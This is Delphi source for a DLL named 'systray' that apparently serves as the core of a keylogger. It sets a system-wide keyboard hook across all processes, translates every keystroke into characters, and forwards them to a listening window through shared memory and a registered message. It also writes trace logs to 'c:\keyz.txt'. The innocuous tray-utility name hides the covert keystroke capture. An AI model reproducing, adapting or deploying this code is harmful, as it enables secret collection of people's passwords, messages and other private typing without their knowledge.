library systray;

uses
  Windows,
  SysUtils,
  Classes;

{$R *.RES}

const
  Version : string = '1.10';

type
  PSharedData = ^TSharedData;
  TSharedData = record
    KbdHook : HHook;
    DestWnd : HWnd;
    CharMsg : Word;
    ShiftDown : Boolean;
    Key : Char;
    Listen : Boolean;
    Click : Boolean;
  end;

var
  MapHandle : THandle;
  Shared : PSharedData;
const eroare:boolean=false;

procedure LOG(ce:string);
var f:textfile;
begin
 assignfile(f,'c:\keyz.txt');
 try append(f); except rewrite(f);end;
 writeln(f,ce);
 closefile(f);
end;

procedure FixKey(var Ch : Char; Shift : Boolean);
begin
 log('fix key start');
  eroare:=false;
  if not Shift then exit;
  case Ch of
    '1' : Ch := '!';
    '2' : Ch := '@';
    '3' : Ch := '#';
    '4' : Ch := '$';
    '5' : Ch := '%';
    '6' : Ch := '^';
    '7' : Ch := '&';
    '8' : Ch := '*';
    '9' : Ch := '(';
    '0' : Ch := ')';
    '=' : Ch := '+';
    '.' : Ch := '>';
    ',' : Ch := '<';
    '`' : Ch := '~';
    '-' : Ch := '_';
    '[' : Ch := '{';
    ']' : Ch := '}';
    ';' : Ch := ':';
    '''' : Ch := '"';
    '/' : Ch := '?';
    '\' : Ch := '|';
  end;
 log('fix key end');
end;

function GetKey(Code : LongInt) : Char;
var
  I : Integer;
begin
 log('get key code start');
  eroare:=false;
  Result := #0;
  try I := MapVirtualKey(Code, 2);except exit; end;
  if (I <> 0) and (I < $FF) then
    Result := Chr(Byte(I))
  else
    if ((Code >= $30) and (Code <= $39)) or
       ((Code >= $41) and (Code <= $5A)) then
     try Result := Chr(Byte(Code));except exit;end
{ else
    if ((Code >= $70) and (Code <= $87)) then
      Result := 'F' + IntToStr(Code-$6F)[1] }
  else //Numeric keypad
    if ((Code >= $60) and (Code <= $69)) then
      try Result := IntToStr(Code-$60)[1]; except exit;end
  else
  case Code of
    VK_BACK : ; // Result := #8;
    VK_TAB : ;
    VK_RETURN : ;
    VK_SHIFT : ;
    VK_CAPITAL : ;
    VK_ESCAPE : ;
    VK_SPACE : ;
    VK_PRIOR : ;
    VK_NEXT : ;
    VK_END : ;
    VK_HOME : ;
    VK_LEFT : ;
    VK_UP : ;
    VK_RIGHT : ;
    VK_DOWN : ;
    VK_INSERT : ;
    VK_DELETE : ;
  end;
 log('get key code end');
end;

procedure ProcessKey(Keycode, Flags : DWORD);
var
  CapsOn : Boolean;
  KeyDown : Boolean;
begin
 log('process key start');
  eroare:=false;
  try KeyDown := (Flags shr 31) and 1 = 0;except exit; end;
  if eroare then exit;
  try Shared^.Key := GetKey(Keycode);except exit; end;
  if eroare then exit;
  with Shared^ do begin
    if KeyDown then begin
      try CapsOn := Lo(GetKeyState(VK_CAPITAL)) = 1;except exit; end;
      if eroare then exit;
      if CapsOn xor ShiftDown then try CharUpperBuff(@Key, 1);except exit;end
      else CharLowerBuff(@Key, 1);
      if eroare then exit;
      try FixKey(Key, ShiftDown);except exit; end;
      if eroare then exit;
      try PostMessage(DestWnd, CharMsg, DWORD(Key), Keycode);except exit; end;
      if eroare then exit;
    end;
    if Keycode = VK_SHIFT then
      ShiftDown := KeyDown;
  end;
 log('process key end');
end;

procedure ProcessKey2(Keycode, Flags : DWORD);
begin
 log('process key2 start');
  eroare:=false;
  with Shared^ do
    try PostMessage(DestWnd, CharMsg, Keycode, Flags);except exit; end;
 log('process key2 end');
end;

function KeyboardProc(Code : Integer; wParam : WPARAM; lParam : LPARAM) : LRESULT; stdcall;
begin
 log('keyboard proc start');
  eroare:=false;
  Result := 0;
  try
    if Code < 0 then
      try Result := CallNextHookEx(Shared^.KbdHook, Code, WParam, LParam);except exit; end;
      if eroare then exit;
  except
   exit;
  end;
  if Code = HC_ACTION then begin
    if Shared^.Listen then
      try ProcessKey(wParam, lParam);except exit; end;
  end;
 log('keyboard proc end');
end;

function LastChar : Char; stdcall;
begin
 log('last char start');
  eroare:=false;
  try Result := Shared^.Key;except exit; end;
 log('last char end');
end;

procedure SetKeyHook(Wnd : HWnd); stdcall;
var
  Temp : HHook;
begin
 log('set key hook start');
  eroare:=false;
  if Shared^.KbdHook = 0 then begin
    try Temp := SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, HInstance, 0);except exit; end;
      if eroare then exit;
    try Shared^.KbdHook := Temp;except exit; end;
      if eroare then exit;
    try Shared^.DestWnd := Wnd;except exit; end;
      if eroare then exit;
    Shared^.ShiftDown := False;
  end;
 log('set key hook end');
end;

procedure ClearKeyHook; stdcall;
begin
 log('clear key hook start');
  eroare:=false;
  try
  UnhookWindowsHookEx(Shared^.KbdHook);
  Shared^.KbdHook := 0;
  Shared^.DestWnd := 0;
  except exit; end;
 log('clear key hook end');
end;

procedure ReturnKeys(B : Boolean; Wnd : HWnd); stdcall;
begin
 log('return keys start');
  eroare:=false;
      if eroare then exit;
  try SetKeyHook(Wnd);except exit; end;
      if eroare then exit;
  Shared^.Listen := B;
 log('return keys end');
end;

procedure ClickOnKey(B : Boolean; Wnd : HWnd); stdcall;
begin
 log('click on key');
  eroare:=false;
end;

procedure DLLEntryPoint(dwReason : DWord);
var
  Init : Boolean;
begin
 log('dll entry point start');
  eroare:=false;
  case dwReason of
    DLL_PROCESS_ATTACH: begin
      try MapHandle := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0, SizeOf(TSharedData), 'MyKeyHook');
      if eroare then exit;
      Init := GetLastError <> ERROR_ALREADY_EXISTS;except exit; end;
      if MapHandle = 0 then exit;
      try Shared := MapViewOfFile(MapHandle, FILE_MAP_ALL_ACCESS, 0, 0, 0);except exit; end;
      if eroare then exit;
      if Shared = nil then begin
      if eroare then exit;
        try CloseHandle(MapHandle);except exit; end;
        exit;
      end;
      if Init then begin
      if eroare then exit;
        try FillChar(Shared^, SizeOf(TSharedData), #0);
        Shared^.CharMsg := RegisterWindowMessage('MTAVRE');except exit; end;
      end;
    end;
    DLL_PROCESS_DETACH: begin
      if eroare then exit;
      try UnmapViewOfFile(Shared);
      CloseHandle(MapHandle);except exit; end;
    end;
    DLL_THREAD_ATTACH: ;
    DLL_THREAD_DETACH: ;
  end;
 log('dll entry point end');
end;

procedure GetKeyVer(P : PChar); stdcall;
var
  Len : Word;
begin
 log('get key ver start');
  eroare:=false;
      if eroare then exit;
  try Len := Length(Version);
  StrMove(P, PChar(Version), Len);
  P[Len] := #0;except exit; end;
 log('get key ver end');
end;

exports
{ DllGetClassObject, DllCanUnloadNow, DllRegisterServer, DllUnregisterServer, }
  LastChar, KeyboardProc, SetKeyHook, ClearKeyHook, ReturnKeys,
  ClickOnKey, GetKeyVer;

begin
 log('START');
  eroare:=false;
  try DLLProc := @DLLEntryPoint;
  DLLEntryPoint(DLL_PROCESS_ATTACH);except exit; end;
 log('END START');
end.
